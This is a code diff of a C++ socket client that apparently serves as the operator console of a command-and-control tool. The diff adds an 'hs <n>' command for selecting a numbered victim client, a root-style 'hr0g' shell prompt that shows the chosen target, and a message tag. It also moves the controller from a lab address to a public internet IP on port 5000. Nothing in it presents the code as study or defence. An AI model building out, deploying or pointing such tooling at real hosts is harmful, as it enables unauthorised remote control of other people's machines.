@@ -11,6 +11,7 @@
 #include <netinet/tcp.h>
 
 std::mutex coutMutex;
+int targetClient = -1;
 
 void setSocketNonBlocking(int sock) {
     int flags = fcntl(sock, F_GETFL, 0);
@@ -22,9 +23,24 @@ void sendMessage(int sock) {
     std::string message;
     while (true) {
         std::getline(std::cin, message);
-        if (message == "bye") break;  // Add a way to break the loop
-
+        //if (message == "bye") break;  // Add a way to break the loop
+        if (message == "exit")
+        {
+            targetClient = -1;
+        }
+        if (strncmp(message.c_str(), "hs", 2) == 0)
+        {
+            const char* digits = message.c_str() +2;
+            while (*digits && std::isspace(*digits)) {
+                ++digits;
+            }
+            if (*digits) {  // Make sure it's not just an empty string
+                // Process the digits
+                targetClient = atoi(digits);  // Convert to an integer
+            }
+        }
         message = std::string("hr0g") + message;
+
         if (send(sock, message.c_str(), message.length(), 0) < 0) {
             std::cerr << "Send failed: " << strerror(errno) << std::endl;
         }
@@ -33,8 +49,16 @@ void sendMessage(int sock) {
 
 void displayReceivedMessage(const std::string& message) {
     std::lock_guard<std::mutex> lock(coutMutex);
-    std::cout << message << std::endl;
-    std::cout << "┌──(root♪hr0g) - [~]" << std::endl << "└─# " << std::flush;
+    if (targetClient != -1)
+    {
+        std::cout << message << std::endl;
+        std::cout << "┌──(root♪hr0g) - [~" << targetClient << "]" << std::endl << "└─# " << std::flush;
+    }
+    else
+    {
+        std::cout << message << std::endl;
+        std::cout << "┌──(root♪hr0g) - [~]" << std::endl << "└─# " << std::flush;
+    }
 }
 
 void receiveMessage(int sock) {
@@ -100,7 +124,7 @@ int main() {
         return 1;
     }
 
-    server.sin_addr.s_addr = inet_addr("192.168.80.132");
+    server.sin_addr.s_addr = inet_addr("154.12.177.190");
     server.sin_family = AF_INET;
     server.sin_port = htons(5000);
 
